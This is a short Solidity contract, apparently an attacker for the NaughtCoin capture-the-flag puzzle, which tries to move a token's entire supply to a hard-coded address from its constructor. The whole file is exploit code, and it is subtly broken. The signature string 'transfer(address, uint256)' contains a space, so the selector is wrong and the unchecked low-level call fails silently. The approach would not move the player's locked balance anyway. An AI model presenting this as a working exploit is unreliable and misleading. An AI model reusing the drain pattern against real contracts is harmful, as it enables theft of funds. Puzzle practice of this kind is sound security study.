pragma solidity ^0.6.0;

contract NaughtCoinAttacker {

    address target;
    uint256 all = 1000000 * (10**uint256(18));
    address to = 0x852378Db38C928f09950657CeB58300081A1c9c3;
    

    constructor(address _addr) public {
        target = _addr;
        target.call(abi.encodeWithSignature('transfer(address, uint256)', to, all));
    }
}
